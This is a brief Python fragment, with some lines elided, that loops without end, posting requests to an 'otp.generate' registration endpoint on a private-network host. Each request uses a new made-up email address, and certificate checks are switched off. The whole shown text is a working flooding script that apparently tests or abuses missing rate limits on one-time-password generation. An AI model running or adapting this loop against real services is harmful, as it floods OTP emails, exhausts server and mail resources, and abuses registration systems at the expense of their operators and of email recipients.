...
headers = {
	...
	"Referer": "https://192.168.2.239/account/register",
...
while True:
    i+=1
    data = '{"0":{"json":{"email":"lepsemospf'+str(i)+'@gufum.com"}}}'
    r = requests.post("https://192.168.2.239/api/trpc/otp.generate?batch=1",headers = headers, data=data, verify=False)
    print(f"{i} {r}")
